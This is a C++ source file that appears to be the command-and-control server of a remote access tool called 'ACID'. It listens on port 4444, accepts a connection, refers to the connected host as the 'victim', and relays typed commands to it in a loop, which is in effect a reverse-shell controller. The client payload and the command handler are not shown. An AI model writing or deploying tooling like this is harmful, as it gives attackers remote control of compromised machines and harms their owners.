#include "server.h"

void banner()
{
  cmd_col::ColoredText(F_LIGHTGREEN);

  std::cout << "MMP\"\"\"\"\"\"\"MM MM'\"\"\"\"'YMM M\"\"M M\"\"\"\"\"\"'YMM \n";
  std::cout << "M' .mmmm  MM M' .mmm. `M M  M M  mmmm. `M \n";
  std::cout << "M         `M M  MMMMMooM M  M M  MMMMM  M \n";
  std::cout << "M  MMMMM  MM M  MMMMMMMM M  M M  MMMMM  M \n";
  std::cout << "M  MMMMM  MM M. `MMM' .M M  M M  MMMM' .M \n";
  std::cout << "M  MMMMM  MM MM.     .dM M  M M       .MM \n";
  std::cout << "MMMMMMMMMMMM MMMMMMMMMMM MMMM MMMMMMMMMMM \n";
}

void help()
{
  std::cout << "Flags:\n";
  std::cout << "\t--hide-ip\t\tHide victim's IP in command line (e.g: 127.0.0.1> )\n";
  std::cout << "\t--hide-banner\t\tHide banner on start of the program\n";
  std::cout << "\t--help\t\t\tSee this menu\n";

  std::cout <<'\n';
}

std::string get_client_ip(SOCKET client)
{
  struct sockaddr_in addr_in;
  char* client_ip;
  int addr_size;

  addr_size = sizeof(addr_in);
  getpeername(client, (struct sockaddr*)&addr_in, &addr_size);
  client_ip = inet_ntoa(addr_in.sin_addr);

  return std::string(client_ip);
}

int main(int argc, char* argv[])
{
  /* check flags */
  int flag_hide_ip = 0;
  int flag_help = 0;
  int flag_hide_banner = 0;
  
  for(int i=1;i<argc;i++) {
    char* cmd_flag = argv[i];

    // Hide IP
    if(strcmp(cmd_flag, "--hide-ip") == 0)
      flag_hide_ip = 1;
    if(strcmp(cmd_flag, "--help") == 0)
      flag_help = 1;
    if(strcmp(cmd_flag, "--hide-banner") == 0)
      flag_hide_banner = 1;
  }
  if(flag_help) help();
  if(!flag_hide_banner) banner();

  /* create connection */
  TCP_Server server(4444);
  
  SOCKET client = server.accept_client();
  if(client != INVALID_SOCKET) {
    cmd_col::ColoredText(F_GREEN);
    std::cout << "[ (+) ACID ] New connection!" << '\n';
  }

  std::string client_ip = get_client_ip(client);
  std::string cmd_prefix;

  /* continue of flags check */
  if(flag_hide_ip) cmd_prefix = "acid";
  else cmd_prefix = client_ip;

  std::string command;
  while(1)
  {
    cmd_col::ColoredText(F_CYAN);
    std::cout << cmd_prefix << "> ";
    cmd_col::ColoredText(F_WHITE);
    std::getline(std::cin, command);
    
    server.process_command(client, command);
  }
  
  return 0;
}